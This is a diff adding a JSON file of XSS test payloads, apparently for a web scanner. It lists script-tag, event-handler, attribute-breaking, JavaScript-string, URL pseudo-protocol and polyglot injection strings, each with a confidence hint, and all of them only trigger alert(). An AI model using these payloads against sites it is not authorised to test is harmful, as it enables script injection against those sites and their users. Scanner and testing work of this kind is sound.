@@ -1,0 +1,28 @@
+{
+  "family": "xss",
+  "version": "1.0.0",
+  "categories": {
+    "html_context": [
+      {"payload": "<script>alert(1)</script>", "description": "Script tag classique", "confidence_hint": 95},
+      {"payload": "<svg onload=alert(1)>",     "description": "SVG avec onload", "confidence_hint": 90},
+      {"payload": "<img src=x onerror=alert(1)>", "description": "Image broken + onerror", "confidence_hint": 90},
+      {"payload": "<details open ontoggle=alert(1)>", "description": "Detail toggle event", "confidence_hint": 85}
+    ],
+    "attribute_context": [
+      {"payload": "\" onmouseover=\"alert(1)",  "description": "Break attribute + event handler", "confidence_hint": 85},
+      {"payload": "' onfocus='alert(1)' autofocus='", "description": "Auto-trigger via focus", "confidence_hint": 85}
+    ],
+    "js_context": [
+      {"payload": "';alert(1);//",              "description": "Sort de string + injecte", "confidence_hint": 95},
+      {"payload": "\";alert(1);//",             "description": "Variante double-quote", "confidence_hint": 95},
+      {"payload": "</script><script>alert(1)</script>", "description": "Break script tag", "confidence_hint": 90}
+    ],
+    "url_context": [
+      {"payload": "javascript:alert(1)",         "description": "Pseudo-protocol", "confidence_hint": 80},
+      {"payload": "data:text/html,<script>alert(1)</script>", "description": "Data URI", "confidence_hint": 75}
+    ],
+    "polyglot": [
+      {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "description": "Polyglot XSS multi-contexte", "confidence_hint": 90}
+    ]
+  }
+}
